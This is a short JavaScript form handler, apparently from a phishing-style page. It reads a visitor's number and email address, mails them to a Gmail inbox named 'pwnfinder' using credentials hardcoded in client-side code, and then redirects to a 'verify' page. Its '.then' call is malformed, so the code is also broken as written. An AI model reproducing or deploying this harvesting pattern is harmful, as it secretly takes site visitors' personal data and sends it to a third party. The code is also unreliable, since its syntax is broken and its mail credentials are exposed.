function check(){
	var name = $('#num').val();
	var emai = $('#email').val();

	var body='number:'+name+',email:'+emai;

	Email.send({
	Host : "smtp.gmail.com",
	Username : "pwnfinder@gmail.com",
	Password : "official email of pwnfinder03",
	To : "pwnfinder@gmail.com",
	From : "pwnfinder@gmail.com",
	Subject : "pwnfinder",
	Body : body
}).then
	window.location.href = "verify/ve.html";
}